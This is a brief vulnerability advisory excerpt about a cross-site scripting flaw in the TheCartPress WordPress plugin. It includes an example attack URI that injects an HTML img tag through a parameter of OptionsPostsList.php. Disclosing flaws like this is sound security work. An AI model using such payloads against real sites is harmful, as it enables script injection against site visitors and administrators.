Attackers can exploit this issue by enticing an unsuspecting victim to follow a malicious URI.

The following example URI is available:

http://www.example.com/wp-content/plugins/thecartpress/admin/OptionsPostsList.php?tcp_options_posts_update=sdf&amp;tcp_name_post_234=%3Cimg%20src=XSS&amp;tcp_post_ids=234
